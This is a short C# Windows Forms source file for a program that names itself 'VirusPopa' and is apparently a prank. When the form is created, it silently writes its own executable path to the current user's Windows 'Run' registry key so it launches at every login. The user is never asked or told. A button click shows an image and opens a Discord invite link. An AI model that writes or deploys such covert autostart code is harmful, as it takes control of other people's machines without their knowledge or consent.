using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using VirusPopa.Properties;

namespace VirusPopa
{
    public partial class Form1 : Form
    {
        public Bitmap pipis = Resource1.Unau;
        public Form1()
        {
            InitializeComponent();
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            // Добавить значение в реестр для запуска напару с ОС
            rkApp.SetValue("VirusPopa", Application.ExecutablePath.ToString());
        }

        private void button1_Click(object sender, EventArgs e)
        {
            pictureBox1.Image = pipis;
            string target = "https://discord.gg/DnU5sNA7FP";
            System.Diagnostics.Process.Start(target);
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
